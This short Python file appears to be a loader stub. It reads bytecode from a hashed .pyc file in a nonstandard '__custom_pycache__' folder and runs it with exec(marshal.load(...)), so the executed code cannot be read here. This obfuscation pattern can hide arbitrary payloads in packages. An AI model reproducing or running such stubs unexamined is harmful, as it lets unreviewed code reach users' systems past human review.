
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'utils_fea38b091ce046038454e4193d5d3ad9.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
